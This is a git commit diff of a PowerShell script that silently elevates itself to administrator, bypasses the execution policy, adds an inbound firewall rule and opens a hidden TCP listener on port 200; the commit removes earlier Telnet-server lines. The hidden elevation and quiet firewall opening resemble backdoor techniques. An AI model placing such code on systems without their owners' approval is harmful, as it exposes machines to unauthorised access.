b73849084a51ba8090bf88555e9c263de30ec64e
njg7716 <36088815+njg7716@users.noreply.github.com>
2019-09-10 10:08:38 -0400

    Clean-up
    I forgot to get rid of some things that did not work

--- ET.ps1
+++ ET.ps1
@@ -1,6 +1,4 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process -WindowStyle hidden powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 $port="200"
-Install-WindowsFeature -Name Telnet-Server
-start-service tlntsvr
-netsh advfirewall firewall add rule name="Open Port $port" dir=in action=allow protocol=TCP localport=$port | Out-Null
-Start-Process -WindowStyle hidden powershell {$x = [System.Net.Sockets.TcpListener]$port; $x.Start(); Start-Sleep -Seconds (30)} | Out-Null
+netsh advfirewall firewall add rule name="Open Port $port" dir=in action=allow protocol=TCP localport=$port | Out-Null #adds Firewall Rule
+Start-Process -WindowStyle hidden powershell {$x = [System.Net.Sockets.TcpListener]$port; $x.Start(); Start-Sleep -Seconds (30)} | Out-Null #opens port and sleeps to keep it open
